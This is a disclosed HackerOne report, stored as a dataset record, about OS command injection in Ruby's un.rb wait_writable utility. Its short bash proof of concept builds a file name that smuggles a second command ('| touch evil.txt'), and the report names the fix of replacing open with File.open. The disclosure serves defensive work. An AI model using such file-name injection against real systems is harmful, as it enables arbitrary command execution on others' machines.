---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1158824'
original_report_id: '1158824'
title: OS Command Injection in '/lib/un.rb -- Utilities to replace common UNIX commands
  in Makefiles etc'
weakness: OS Command Injection
team_handle: ruby
created_at: '2021-04-09T13:15:22.656Z'
disclosed_at: '2021-07-19T09:54:30.940Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 4
asset_identifier: https://github.com/ruby/ruby
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- os-command-injection
---

# OS Command Injection in '/lib/un.rb -- Utilities to replace common UNIX commands in Makefiles etc'

## Metadata

- HackerOne Report ID: 1158824
- Weakness: OS Command Injection
- Program: ruby
- Disclosed At: 2021-07-19T09:54:30.940Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

If the `wait_writable` command  receives a list of files with a command in the name of one of them, it will be executed.

# PoC

```bash
$ touch \|\ touch\ evil.txt
$ ls
'| touch evil.txt'
$ ruby -run -e wait_writable -- -w 1 -v *
$ ls
evil.txt  '| touch evil.txt'
```

The vulnerability has the same severity as https://hackerone.com/reports/651518 . The fix, respectively, is the same: `open` -> `File.open`.

## Impact

An attacker can use this problem to execute arbitrary commands in environments that uses ruby coreutilities.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
